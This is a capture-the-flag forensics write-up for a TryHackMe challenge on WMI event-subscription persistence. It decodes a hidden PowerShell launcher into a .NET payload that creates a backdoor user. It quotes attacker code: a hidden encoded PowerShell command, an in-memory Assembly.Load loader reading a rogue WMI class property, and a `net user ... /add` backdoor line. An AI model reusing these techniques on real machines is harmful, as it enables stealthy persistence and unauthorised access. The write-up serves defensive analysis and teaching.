| Field | Detail |
|------|--------|
| **Platform** | TryHackMe |
| **Event** | Hacker Holidays 2026 — The Byte Lotus |
| **Day** | 12 |
| **Room** | After Hours |
| **Category** | Forensics / WMI persistence → rogue class `ConfigData` → .NET payload |
| **Flag format** | `THM{...}` |

---

## Objective

**After Hours** is a **forensics** challenge built on WMI CIM repository artifacts pulled from the resort's back-office machine — `OBJECTS.DATA` (object store), `INDEX.BTR` (B-tree index) and `MAPPING1/2/3.MAP` (page maps), the on-disk Windows Management Instrumentation database normally living at `C:\Windows\System32\wbem\Repository\`. The persistence hides in the "quiet corner most tools don't check": standard Autoruns / Run-key / Scheduled-Task tooling historically misses **WMI Event Subscription persistence** (`__EventFilter` + `EventConsumer` + `__FilterToConsumerBinding`). The actual payload is stashed as a **custom property on a rogue WMI class masquerading as a legit one**. The objective: parse the WMI repository for hidden custom configuration data, locate the malicious class, extract and decode its embedded payload, and recover the flag.

By the end of this room you will be able to:

- Recognise a **WMI CIM repository** on disk (`OBJECTS.DATA` + `INDEX.BTR` + `MAPPING*.MAP`) and know it is a first-class persistence surface
- Carve **WMI Event Subscription persistence** (`__EventFilter`, `CommandLineEventConsumer`, `__FilterToConsumerBinding`) and a `CommandLineTemplate` launcher out of the raw object store with `strings`
- Decode a **UTF-16LE Base64 `-enc` PowerShell launcher** and follow its data flow rather than stopping at the first decode
- Spot a **rogue class** (`Win32_HardwareTelemetry`) whose custom writable property (`ConfigData`) is really a covert storage blob
- Turn a Base64 blob into a **.NET assembly** via raw DEFLATE (`-15`, no header) and confirm the `MZ` header
- Read a payload's **UTF-16LE user strings** (`strings -e l`) to reveal a machine-name gate and a backdoor `net user` command, then Base64-decode the flag

> **Authorisation warning:** The techniques below — carving WMI persistence, extracting and decoding an embedded .NET payload, and reversing a backdoor command — must only ever be run against systems you have **explicit authorization** to test, here the TryHackMe lab. Running them against systems you do not own or control is illegal.

---

## Story Hook

@0xMia's PSA sets the whole thing up: _"autoruns/persistence tools straight up don't catch this one… dig through the raw data by hand."_ The back-office machine at the Byte Lotus kept running something long **after hours**, but every standard persistence check came back clean. That is the tell — the implant lives in the **WMI repository**, the corner Run-key/Startup/Task tooling never looks. The launcher you eventually carve out is a decoy of sorts: it carries no payload itself, only the instructions to read a **custom property on a WMI class that only sounds legitimate** and execute it entirely in memory. Follow the data, not the first thing that decodes.

---

## Attack Path

| **1** | **Identify the artifacts**<br>`OBJECTS.DATA` (object store) + `INDEX.BTR` (B-tree index) + `MAPPING*.MAP` (page maps) = a WMI CIM repository, normally at `C:\Windows\System32\wbem\Repository\`. |
| --- | --- |

| **2** | **Find the persistence**<br>Carving strings from `OBJECTS.DATA` shows the classic trio (`__EventFilter`, `CommandLineEventConsumer`, `__FilterToConsumerBinding`) plus a `CommandLineTemplate` running `cmd /C powershell.exe -Sta -Nop -Window Hidden -enc <base64>`. |
| --- | --- |

| **3** | **Decode the `-enc` launcher (UTF-16LE Base64)**<br>It doesn't carry the payload itself — it **reads a custom WMI class property** (`ConfigData`) and executes it in memory via `[Reflection.Assembly]::Load(...)`. |
| --- | --- |

| **4** | **Locate the hidden config data**<br>The rogue class `Win32_HardwareTelemetry` (fake — impersonates a real-sounding telemetry class) carries a custom `ConfigData` property holding a ~2.2 KB Base64 blob (`7VZPbFRF…Z/Q06F8=`). |
| --- | --- |

| **5** | **Extract the payload**<br>`ConfigData` = Base64 → raw DEFLATE → a 4096-byte .NET assembly (`MZ` header). It is `updates.exe`, namespace `AfterHours`, class `Program`. |
| --- | --- |

| **6** | **Read the payload logic**<br>The assembly's .NET UTF-16 user strings reveal a machine-name gate — `Environment.MachineName == "bytelotusdc"`, else `Execution halted: Environment mismatch.` — and on match it runs `cmd.exe /c net user patch VEhNe1A0dGNoX29wM25lZF90aDNfQmFjS2QwMHJ9 /add`. |
| --- | --- |

| **7** | **Decode the flag**<br>The new user `patch`'s "password" is Base64 → `VEhNe1A0dGNoX29wM25lZF90aDNfQmFjS2QwMHJ9` decodes to the flag. |
| --- | --- |

---

## Walkthrough

The whole chain is self-contained in `OBJECTS.DATA`; no live WMI needed. On Kali, carve the persistence and `-enc` launcher out of the object store, decode the launcher, pull the rogue class `ConfigData` blob, inflate it to the .NET assembly, read its UTF-16 strings, and Base64-decode the backdoor password:

```bash
# 0) Artifacts (from the AttackBox luggage room)
#    /root/Rooms/hacker-holidays-2026/after-hours  (lockbox pass: Aft3rH0ursAtt4chm3ntP4ss)
#    -> OBJECTS.DATA, INDEX.BTR, MAPPING1/2/3.MAP  == a WMI CIM repository

# 1) Carve the persistence + the -enc launcher out of the object store
$ strings -n 8 OBJECTS.DATA | grep -Ei 'EventFilter|EventConsumer|FilterToConsumer|CommandLineTemplate|powershell.*-enc'

# 2) Decode the UTF-16LE PowerShell launcher (reveals the ConfigData read + Assembly::Load)
$ python3 -c 'import base64,sys; print(base64.b64decode(sys.argv[1]).decode("utf-16-le"))' JABmAGkAbABl...==

# 3) Pull the rogue class ConfigData blob (Base64) — the big 7VZPbFRF... string
$ strings -n 8 OBJECTS.DATA | grep -Eo '7VZPbFRF[A-Za-z0-9+/=]+' | head -1 > configdata.b64

# 4) ConfigData = Base64 -> raw DEFLATE -> .NET assembly (updates.exe)
$ python3 - <<'PY'
import base64, zlib
blob = open('configdata.b64').read().strip()
data = zlib.decompress(base64.b64decode(blob), -15)   # -15 = raw deflate, no header
open('payload.exe','wb').write(data)
print(len(data), data[:2])                             # 4096 b'MZ'
PY

# 5) Read the payload's UTF-16 strings (or decompile with monodis / ilspycmd)
$ strings -e l payload.exe
#   ... bytelotusdc
#   ... /c net user patch VEhNe1A0dGNoX29wM25lZF90aDNfQmFjS2QwMHJ9 /add

# 6) Decode the backdoor "password" == the flag
$ echo 'VEhNe1A0dGNoX29wM25lZF90aDNfQmFjS2QwMHJ9' | base64 -d
#   THM{P4tch_op3ned_th3_BacKd00r}
```

Step 2's `-enc` decode is the pivot of the whole challenge — it is not the payload, only a bootstrapper that reads a custom WMI class property, DEFLATE-decompresses it, and `Assembly.Load`s it entirely in memory (no file on disk):

```powershell
$file = ([WmiClass]'ROOT\cimv2:Win32_HardwareTelemetry').Properties['ConfigData'].Value
$o = New-Object IO.MemoryStream
$d = New-Object IO.Compression.DeflateStream(
       [IO.MemoryStream][Convert]::FromBase64String($file),
       [IO.Compression.CompressionMode]::Decompress)
# ...copy/decompress into $o...
[Reflection.Assembly]::Load($o.ToArray()).EntryPoint.Invoke($null,@(,[string[]]@())) | Out-Null
```

---

## Flag

> **🚩 Flag**
>
> `THM{P4tch_op3ned_th3_BacKd00r}`

The backdoor's `net user patch … /add` "password" was just the flag Base64-encoded — `patch` **opened the backdoor**.

### Key facts

| Item | Value |
|---|---|
| Artifacts | WMI CIM repository: `OBJECTS.DATA`, `INDEX.BTR`, `MAPPING1/2/3.MAP` |
| Lockbox pass | `Aft3rH0ursAtt4chm3ntP4ss` (AttackBox luggage room) |
| Persistence | `__EventFilter` + `CommandLineEventConsumer` + `__FilterToConsumerBinding` |
| Launcher | `cmd /C powershell.exe -Sta -Nop -Window Hidden -enc <UTF-16 base64>` |
| Launcher logic | reads `ROOT\cimv2:Win32_HardwareTelemetry` → `ConfigData`, DEFLATE-decompress, `[Reflection.Assembly]::Load(...).EntryPoint.Invoke()` |
| Hidden config data | rogue class `Win32_HardwareTelemetry`, custom `ConfigData` property (Base64 blob `7VZPbFRF…Z/Q06F8=`) |
| Payload | `ConfigData` = Base64 → raw DEFLATE → 4096-byte .NET assembly `updates.exe` (namespace `AfterHours`) |
| Payload gate | `Environment.MachineName == "bytelotusdc"` else `Execution halted: Environment mismatch.` |
| Backdoor action | `cmd.exe /c net user patch VEhNe1A0dGNoX29wM25lZF90aDNfQmFjS2QwMHJ9 /add` |
| Flag encoding | Base64: `VEhNe1A0dGNoX29wM25lZF90aDNfQmFjS2QwMHJ9` |
| Flag | `THM{P4tch_op3ned_th3_BacKd00r}` |

---

## Key Takeaways

- **WMI is a first-class persistence surface — hunt it explicitly.** `__EventFilter` + an `EventConsumer` (`CommandLine`/`ActiveScript`) + `__FilterToConsumerBinding` survive reboots and are invisible to Run-key/Startup/Task tooling. Baseline the repository (`Get-WmiObject -Namespace root\subscription -Class __*`, Sysmon Event IDs 19/20/21, or offline parsing of `OBJECTS.DATA`).
- **Rogue classes masquerade as legitimate ones.** `Win32_HardwareTelemetry` sounds real but isn't a stock WMI class; a custom writable property (`ConfigData`) made the repository a covert storage blob. Enumerate non-standard classes and unexpected string properties, don't trust names.
- **The launcher is rarely the payload.** The `-enc` command only *bootstrapped* — it read data from WMI, decompressed it, and `Assembly.Load`'d it entirely in memory (no file on disk). Follow the data flow (`Properties[...]`, `FromBase64String`, `DeflateStream`, `Assembly::Load`) instead of stopping at the first Base64 decode.
- **Watch the encoding when carving strings.** The flag never showed up in an ASCII strings pass because it lives in the assembly's **UTF-16LE** user-string heap; use `strings -e l` / a Unicode pass (or a decompiler) on .NET binaries.
- **Environment-keyed execution is an anti-analysis tactic.** The `MachineName == "bytelotusdc"` guard means the payload no-ops in a sandbox/analyst box; static extraction (read the IL/strings) beats detonation here.

---

## Final Takeaway

After Hours is a lesson in looking where the tools don't. The implant survives as **WMI Event Subscription persistence** — an `__EventFilter` bound to a `CommandLineEventConsumer` through a `__FilterToConsumerBinding` — which no Run-key, Startup or Scheduled-Task check will ever surface. The `-enc` **PowerShell launcher** you carve out of `OBJECTS.DATA` is deliberately hollow: it reads a custom `ConfigData` property off a **rogue class** (`Win32_HardwareTelemetry`, a name that only sounds like a stock WMI class), raw-DEFLATE-inflates it into a 4096-byte **.NET assembly**, and `Assembly.Load`s it entirely in memory. The payload gates on `Environment.MachineName == "bytelotusdc"` — an **anti-analysis** guard that no-ops in a sandbox — and the flag hides in the assembly's **UTF-16LE** user-string heap as a Base64 "password" for a backdoor `net user patch … /add`. The recurring theme is following the data flow through every layer instead of stopping at the first decode, and hunting the repository by hand when automation goes quiet.

---
*Adapted from the [Hacker Holidays 2026 findings log](https://github.com/Varun-Patkar/HackerHolidays) by Varun Anand Patkar (MIT License).*
